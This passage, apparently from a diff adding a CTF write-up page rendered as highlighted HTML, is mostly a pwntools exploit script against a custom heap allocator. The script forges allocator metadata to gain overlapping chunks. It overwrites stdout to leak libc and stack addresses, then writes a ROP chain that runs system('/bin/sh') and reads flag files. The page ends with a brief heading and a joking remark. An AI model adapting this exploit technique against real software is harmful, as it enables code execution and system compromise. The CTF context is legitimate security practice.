+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">for</span> i <span style="color:#ff7b72;font-weight:bold">in</span> range(<span style="color:#a5d6ff">129</span>):
+</span></span><span style="display:flex;"><span>                alloc(r, <span style="color:#a5d6ff">0</span>, <span style="color:#a5d6ff">0x10</span>, SNALLOC)
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># allocate tcache_perthread</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># consume the 0xff0 unsorted bins between the snabs</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># these chunks were padding that kept snabs page-aligned</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">for</span> i <span style="color:#ff7b72;font-weight:bold">in</span> range(<span style="color:#a5d6ff">47</span>):
+</span></span><span style="display:flex;"><span>                alloc(r, <span style="color:#a5d6ff">0</span>, <span style="color:#a5d6ff">0xe8</span>, MALLOC)
+</span></span><span style="display:flex;"><span>            alloc(r, <span style="color:#a5d6ff">0</span>, <span style="color:#a5d6ff">0xb8</span>, MALLOC)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># allocate 0xff0 bytes of padding after the third snab</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">for</span> i <span style="color:#ff7b72;font-weight:bold">in</span> range(<span style="color:#a5d6ff">4</span>):
+</span></span><span style="display:flex;"><span>                alloc(r, <span style="color:#a5d6ff">0</span>, <span style="color:#a5d6ff">0xb8</span>, MALLOC)
+</span></span><span style="display:flex;"><span>            alloc(r, <span style="color:#a5d6ff">0</span>, <span style="color:#a5d6ff">0xa8</span>, MALLOC)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">for</span> i <span style="color:#ff7b72;font-weight:bold">in</span> range(<span style="color:#a5d6ff">118</span>):
+</span></span><span style="display:flex;"><span>                alloc(r, i, <span style="color:#a5d6ff">0x58</span>, MALLOC)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># now the next allocation&#39;s data will be page alligned</span>
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># we can forge a fake metadata chunk</span>
+</span></span><span style="display:flex;"><span>            alloc(r, <span style="color:#a5d6ff">118</span>, <span style="color:#a5d6ff">0x58</span>, MALLOC)
+</span></span><span style="display:flex;"><span>            fake_metadata <span style="color:#ff7b72;font-weight:bold">=</span> p64(<span style="color:#a5d6ff">0</span>) <span style="color:#8b949e;font-style:italic"># magic (this will be overwritten)</span>
+</span></span><span style="display:flex;"><span>            fake_metadata <span style="color:#ff7b72;font-weight:bold">+=</span> p64(<span style="color:#a5d6ff">3</span>) <span style="color:#8b949e;font-style:italic"># flags</span>
+</span></span><span style="display:flex;"><span>            fake_metadata <span style="color:#ff7b72;font-weight:bold">+=</span> p64(<span style="color:#a5d6ff">1</span>) <span style="color:#8b949e;font-style:italic"># order</span>
+</span></span><span style="display:flex;"><span>            fake_metadata <span style="color:#ff7b72;font-weight:bold">+=</span> p64(<span style="color:#a5d6ff">0x1</span>) <span style="color:#8b949e;font-style:italic"># mark the first chunk as allocated</span>
+</span></span><span style="display:flex;"><span>            edit(r, <span style="color:#a5d6ff">118</span>, fake_metadata, <span style="color:#a5d6ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># fill 0x60 tcache</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">for</span> i <span style="color:#ff7b72;font-weight:bold">in</span> range(<span style="color:#a5d6ff">7</span>):
+</span></span><span style="display:flex;"><span>                delete(r, i, MALLOC)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># free the rest of the chunks into fastbins</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">for</span> i <span style="color:#ff7b72;font-weight:bold">in</span> range(<span style="color:#a5d6ff">118</span>, <span style="color:#a5d6ff">6</span>, <span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>):
+</span></span><span style="display:flex;"><span>                delete(r, i, MALLOC)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># trigger fastbins consolidation</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># they also consolidate with the top chunk</span>
+</span></span><span style="display:flex;"><span>            r<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;1</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">1</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">0</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;0&#34;</span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0x810</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># NOTE: freeing the chunk containing the fake metadata first</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># was done to replace the &#34;magic&#34; with a mangled fastbin fd</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># as this was the first element to be freed it&#39;s fd would be 0,</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># thus the mangled pointer would be (address&gt;&gt;12),</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># which is a valid &#34;magic&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># now we have a valid fake metadata chunk far down in the top chunk</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># allocate an order 3 snab and fill the first page</span>
+</span></span><span style="display:flex;"><span>            alloc(r, <span style="color:#a5d6ff">0xffe</span>, <span style="color:#a5d6ff">0x100</span>, SNALLOC)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">for</span> i <span style="color:#ff7b72;font-weight:bold">in</span> range(<span style="color:#a5d6ff">14</span>):
+</span></span><span style="display:flex;"><span>                alloc(r, <span style="color:#a5d6ff">101</span><span style="color:#ff7b72;font-weight:bold">+</span>i, <span style="color:#a5d6ff">0x100</span>, SNALLOC)
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># This will be the last chunk in the page and we will use it</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># to set the size of the fake snab</span>
+</span></span><span style="display:flex;"><span>            size_chunk <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">14</span>
+</span></span><span style="display:flex;"><span>            alloc(r, size_chunk, <span style="color:#a5d6ff">0x100</span>, SNALLOC)
+</span></span><span style="display:flex;"><span>            edit(r, size_chunk, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;C&#34;</span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0xf8</span> <span style="color:#ff7b72;font-weight:bold">+</span> p64(<span style="color:#a5d6ff">0x3011</span>), SNALLOC) <span style="color:#8b949e;font-style:italic"># set fake size</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#8b949e;font-style:italic"># this overlaps the fake metadata chunk</span>
+</span></span><span style="display:flex;"><span>            fake_metadata_chunk <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0xffd</span>
+</span></span><span style="display:flex;"><span>            alloc(r, fake_metadata_chunk, <span style="color:#a5d6ff">0x100</span>, SNALLOC) 
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># fill the whole user-data page (the second one in the order 3 snab)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">for</span> i <span style="color:#ff7b72;font-weight:bold">in</span> range(<span style="color:#a5d6ff">15</span>):
+</span></span><span style="display:flex;"><span>                alloc(r, <span style="color:#a5d6ff">101</span><span style="color:#ff7b72;font-weight:bold">+</span>i, <span style="color:#a5d6ff">0x100</span>, SNALLOC)
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># this will overlap with the first allocation of the fake snab</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># (this chunk is located at the start of the third page of user-data</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># of the order 3 snab)</span>
+</span></span><span style="display:flex;"><span>            alloc(r, <span style="color:#a5d6ff">15</span>, <span style="color:#a5d6ff">0x100</span>, SNALLOC)
+</span></span><span style="display:flex;"><span>            edit(r, <span style="color:#a5d6ff">15</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;B&#34;</span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0x100</span>, SNALLOC)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># VULN: delete the chunk we just allocated, </span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># this will free our fake metadata chunk</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># This frees the whole snab which has order 1 (size 0x3010 set above)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># and consolidates with the top chunk</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># WE NOW GAINED AN OVERLAPPING CHUNK PRIMITIVE</span>
+</span></span><span style="display:flex;"><span>            delete(r, <span style="color:#a5d6ff">15</span>, SNALLOC)
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># consume the 0x980 bytes unsortedbin left above the order 3 snab</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">for</span> i <span style="color:#ff7b72;font-weight:bold">in</span> range(<span style="color:#a5d6ff">19</span>):
+</span></span><span style="display:flex;"><span>                alloc(r, i, <span style="color:#a5d6ff">0x78</span>, MALLOC)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># allocate a bunch of stuff from the top chunk</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># These chunks are overlapped by the order 3 snab</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># and will be turned into a big overlapping chunk (size 0x15a0)</span>
+</span></span><span style="display:flex;"><span>            overlapping_chunk <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0xfff</span>
+</span></span><span style="display:flex;"><span>            alloc(r, overlapping_chunk, <span style="color:#a5d6ff">0x78</span>, MALLOC)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">for</span> i <span style="color:#ff7b72;font-weight:bold">in</span> range(<span style="color:#a5d6ff">31</span>):
+</span></span><span style="display:flex;"><span>                alloc(r, i, <span style="color:#a5d6ff">0x78</span>, MALLOC)
+</span></span><span style="display:flex;"><span>            alloc(r, <span style="color:#a5d6ff">0</span>, <span style="color:#a5d6ff">0x18</span>, MALLOC)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">for</span> i <span style="color:#ff7b72;font-weight:bold">in</span> range(<span style="color:#a5d6ff">8</span>):
+</span></span><span style="display:flex;"><span>                alloc(r, i<span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">1</span>, <span style="color:#a5d6ff">0xa8</span>, MALLOC)
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># free the last 8 allocations (0x580 bytes) (fill 0xb0 tcache)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># the order doesn&#39;t matter as we don&#39;t need page alignment </span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># for the fake snab metadata</span>
+</span></span><span style="display:flex;"><span>            delete(r, <span style="color:#a5d6ff">8</span>, MALLOC)
+</span></span><span style="display:flex;"><span>            delete(r, <span style="color:#a5d6ff">7</span>, MALLOC)
+</span></span><span style="display:flex;"><span>            delete(r, <span style="color:#a5d6ff">6</span>, MALLOC)
+</span></span><span style="display:flex;"><span>            delete(r, <span style="color:#a5d6ff">5</span>, MALLOC)
+</span></span><span style="display:flex;"><span>            delete(r, <span style="color:#a5d6ff">4</span>, MALLOC)
+</span></span><span style="display:flex;"><span>            delete(r, <span style="color:#a5d6ff">2</span>, MALLOC)
+</span></span><span style="display:flex;"><span>            delete(r, <span style="color:#a5d6ff">1</span>, MALLOC)
+</span></span><span style="display:flex;"><span>            delete(r, <span style="color:#a5d6ff">3</span>, MALLOC) <span style="color:#8b949e;font-style:italic"># this goes into smallbins (libc pointer here)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># also note that the smallbin is placed exactly where the next</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># allocation from the order 3 snab will be</span>
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># merge the chunks allocated above by faking a size of 0x15a0</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># this is now a big overlapping chunk</span>
+</span></span><span style="display:flex;"><span>            edit(r, size_chunk, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;C&#34;</span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0xf8</span> <span style="color:#ff7b72;font-weight:bold">+</span> p64(<span style="color:#a5d6ff">0x15a1</span>), SNALLOC)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># free the overlapping chunk to top chunk</span>
+</span></span><span style="display:flex;"><span>            delete(r, overlapping_chunk, MALLOC)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># allocate an order 1 snab and fill it with 0x80 chunks</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># this will be allocated from the old 0x3011 chunk, so it&#39;s still</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># overlapped by the order 3 snab</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">for</span> i <span style="color:#ff7b72;font-weight:bold">in</span> range(<span style="color:#a5d6ff">64</span>):
+</span></span><span style="display:flex;"><span>                alloc(r, <span style="color:#a5d6ff">1</span>, <span style="color:#a5d6ff">0x80</span>, SNALLOC)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># this allocation will allocate another order 1 snab</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># and add a next pointer to the first one</span>
+</span></span><span style="display:flex;"><span>            alloc(r, <span style="color:#a5d6ff">1</span>, <span style="color:#a5d6ff">0x80</span>, SNALLOC)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># now we partial override the next pointer of the first snab</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># to create a chain with the smallbin libc pointer, </span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># this is possibile beacuse we increased snab_count above).</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># We also set the snab as full so the next allocation will go to the</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># next one in the linked list, which is the freed smallbin with the</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># libc pointer</span>
+</span></span><span style="display:flex;"><span>            bitmap <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0xffffffffffffffff</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># 4 bit bruteforce</span>
+</span></span><span style="display:flex;"><span>            fake_metadata <span style="color:#ff7b72;font-weight:bold">=</span> flat(<span style="color:#a5d6ff">0</span>, <span style="color:#a5d6ff">3</span>, <span style="color:#a5d6ff">1</span>, bitmap, <span style="color:#a5d6ff">0</span>) <span style="color:#ff7b72;font-weight:bold">+</span> p16(<span style="color:#a5d6ff">0x7160</span>)
+</span></span><span style="display:flex;"><span>            edit(r, fake_metadata_chunk, fake_metadata, SNALLOC)
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># this chunk gets allocated from the order 3 snab </span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># (which overlaps our forged snab)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># this chunk overlaps with the smallbin and it&#39;s useful to </span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># partial override it&#39;s pointer</span>
+</span></span><span style="display:flex;"><span>            smallbin_overlap_chunk <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">1</span>
+</span></span><span style="display:flex;"><span>            alloc(r, smallbin_overlap_chunk, <span style="color:#a5d6ff">0x100</span>, SNALLOC)
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># we partial override the bk of the smallbin to make it point to</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># _IO_2_1_stdout_</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># We also mark the snab as full so next allocation overlaps stdout</span>
+</span></span><span style="display:flex;"><span>            bitmap <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0xffffffffffffffff</span> 
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># another 4 bit bruteforce</span>
+</span></span><span style="display:flex;"><span>            fake_metadata <span style="color:#ff7b72;font-weight:bold">=</span> flat(<span style="color:#a5d6ff">0</span>, <span style="color:#a5d6ff">3</span>, <span style="color:#a5d6ff">1</span>, bitmap, <span style="color:#a5d6ff">0</span>) <span style="color:#ff7b72;font-weight:bold">+</span> p16(<span style="color:#a5d6ff">0x95b0</span>)
+</span></span><span style="display:flex;"><span>            edit(r, smallbin_overlap_chunk, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;F&#34;</span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0x60</span> <span style="color:#ff7b72;font-weight:bold">+</span> fake_metadata, SNALLOC)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># allocate from the order 1 snab (overlap stdout)</span>
+</span></span><span style="display:flex;"><span>            alloc(r, <span style="color:#a5d6ff">0xe00</span>, <span style="color:#a5d6ff">0x80</span>, SNALLOC)
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># partial override stdout to get libc leak</span>
+</span></span><span style="display:flex;"><span>            payload <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;A&#34;</span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0x10</span> <span style="color:#ff7b72;font-weight:bold">+</span> p64(<span style="color:#a5d6ff">0xfbad1887</span>) <span style="color:#ff7b72;font-weight:bold">+</span> p64(<span style="color:#a5d6ff">0</span>)<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">3</span> <span style="color:#ff7b72;font-weight:bold">+</span> p8(<span style="color:#a5d6ff">0</span>)
+</span></span><span style="display:flex;"><span>            edit(r, <span style="color:#a5d6ff">0xe00</span>, payload, SNALLOC)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># leak libc</span>
+</span></span><span style="display:flex;"><span>            r<span style="color:#ff7b72;font-weight:bold">.</span>recvuntil(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;content&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>            libc<span style="color:#ff7b72;font-weight:bold">.</span>address <span style="color:#ff7b72;font-weight:bold">=</span> u64(r<span style="color:#ff7b72;font-weight:bold">.</span>recvn(<span style="color:#a5d6ff">8</span>)) <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">0x20a644</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># check if the leak is correct (otherwise we need to brute more)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">if</span> libc<span style="color:#ff7b72;font-weight:bold">.</span>address <span style="color:#ff7b72;font-weight:bold">&amp;</span> <span style="color:#a5d6ff">0xfff</span> <span style="color:#ff7b72;font-weight:bold">!=</span> <span style="color:#a5d6ff">0</span>:
+</span></span><span style="display:flex;"><span>                r<span style="color:#ff7b72;font-weight:bold">.</span>close()
+</span></span><span style="display:flex;"><span>                <span style="color:#ff7b72">continue</span>
+</span></span><span style="display:flex;"><span>            log<span style="color:#ff7b72;font-weight:bold">.</span>info(<span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&#34;libc: </span><span style="color:#a5d6ff">{</span>hex(libc<span style="color:#ff7b72;font-weight:bold">.</span>address)<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># partial override stdout again to gain arbitrary read and leak stack</span>
+</span></span><span style="display:flex;"><span>            payload <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;A&#34;</span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0x10</span> 
+</span></span><span style="display:flex;"><span>            payload <span style="color:#ff7b72;font-weight:bold">+=</span> p64(<span style="color:#a5d6ff">0xfbad1887</span>) 
+</span></span><span style="display:flex;"><span>            payload <span style="color:#ff7b72;font-weight:bold">+=</span> p64(<span style="color:#a5d6ff">0</span>)<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">3</span> 
+</span></span><span style="display:flex;"><span>            payload <span style="color:#ff7b72;font-weight:bold">+=</span> p64(libc<span style="color:#ff7b72;font-weight:bold">.</span>sym<span style="color:#ff7b72;font-weight:bold">.</span>environ) 
+</span></span><span style="display:flex;"><span>            payload <span style="color:#ff7b72;font-weight:bold">+=</span> p64(libc<span style="color:#ff7b72;font-weight:bold">.</span>sym<span style="color:#ff7b72;font-weight:bold">.</span>environ<span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">0x20</span>)<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">3</span> 
+</span></span><span style="display:flex;"><span>            payload <span style="color:#ff7b72;font-weight:bold">+=</span> p64(libc<span style="color:#ff7b72;font-weight:bold">.</span>sym<span style="color:#ff7b72;font-weight:bold">.</span>environ<span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">0x21</span>)
+</span></span><span style="display:flex;"><span>            edit(r, <span style="color:#a5d6ff">0xe00</span>, payload, SNALLOC)
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># leak stack</span>
+</span></span><span style="display:flex;"><span>            r<span style="color:#ff7b72;font-weight:bold">.</span>recvuntil(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34; &#34;</span>)
+</span></span><span style="display:flex;"><span>            stack <span style="color:#ff7b72;font-weight:bold">=</span> u64(r<span style="color:#ff7b72;font-weight:bold">.</span>recvn(<span style="color:#a5d6ff">8</span>)) <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">0x160</span>
+</span></span><span style="display:flex;"><span>            log<span style="color:#ff7b72;font-weight:bold">.</span>info(<span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&#34;stack: </span><span style="color:#a5d6ff">{</span>hex(stack)<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># use the chunk overlapping the smallbin to change the snab-&gt;next to</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># the return address of do_cmd()</span>
+</span></span><span style="display:flex;"><span>            bitmap <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0xffffffffffffffff</span>
+</span></span><span style="display:flex;"><span>            fake_metadata <span style="color:#ff7b72;font-weight:bold">=</span> flat(<span style="color:#a5d6ff">0</span>, <span style="color:#a5d6ff">3</span>, <span style="color:#a5d6ff">1</span>, bitmap, <span style="color:#a5d6ff">0</span>) <span style="color:#ff7b72;font-weight:bold">+</span> p64(stack <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">0x1000</span>)
+</span></span><span style="display:flex;"><span>            edit(r, smallbin_overlap_chunk, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;F&#34;</span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0x60</span> <span style="color:#ff7b72;font-weight:bold">+</span> fake_metadata, SNALLOC)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># allocate on the stack</span>
+</span></span><span style="display:flex;"><span>            alloc(r, <span style="color:#a5d6ff">0xe01</span>, <span style="color:#a5d6ff">0x80</span>, SNALLOC)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># ROP on the retaddr of do_cmd()</span>
+</span></span><span style="display:flex;"><span>            POP_RDI <span style="color:#ff7b72;font-weight:bold">=</span> libc<span style="color:#ff7b72;font-weight:bold">.</span>address <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x0000000000102dea</span>
+</span></span><span style="display:flex;"><span>            rop_chain <span style="color:#ff7b72;font-weight:bold">=</span> p64(POP_RDI<span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">1</span>) <span style="color:#8b949e;font-style:italic"># ret</span>
+</span></span><span style="display:flex;"><span>            rop_chain <span style="color:#ff7b72;font-weight:bold">+=</span> p64(POP_RDI)
+</span></span><span style="display:flex;"><span>            rop_chain <span style="color:#ff7b72;font-weight:bold">+=</span> p64(next(libc<span style="color:#ff7b72;font-weight:bold">.</span>search(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;/bin/sh&#34;</span>)))
+</span></span><span style="display:flex;"><span>            rop_chain <span style="color:#ff7b72;font-weight:bold">+=</span> p64(libc<span style="color:#ff7b72;font-weight:bold">.</span>sym<span style="color:#ff7b72;font-weight:bold">.</span>system)
+</span></span><span style="display:flex;"><span>            payload <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;A&#34;</span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0x80</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># debug(r)</span>
+</span></span><span style="display:flex;"><span>            edit(r, <span style="color:#a5d6ff">0xe01</span>, rop_chain, SNALLOC)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># GG</span>
+</span></span><span style="display:flex;"><span>            r<span style="color:#ff7b72;font-weight:bold">.</span>sendline(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;ls&#34;</span>)
+</span></span><span style="display:flex;"><span>            r<span style="color:#ff7b72;font-weight:bold">.</span>sendline(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;cat f*&#34;</span>)
+</span></span><span style="display:flex;"><span>            r<span style="color:#ff7b72;font-weight:bold">.</span>sendline(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;cat /f*&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            r<span style="color:#ff7b72;font-weight:bold">.</span>interactive()
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">break</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">except</span>:
+</span></span><span style="display:flex;"><span>            r<span style="color:#ff7b72;font-weight:bold">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">if</span> <span style="color:#79c0ff">__name__</span> <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><h4 id="something-something-heap-feng-shui">
+  Something something heap feng shui
+  <a class="heading-link" href="#something-something-heap-feng-shui">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h4>
+<p>This archaeological finding is what we used to communicate during the CTF at 5 am lmao
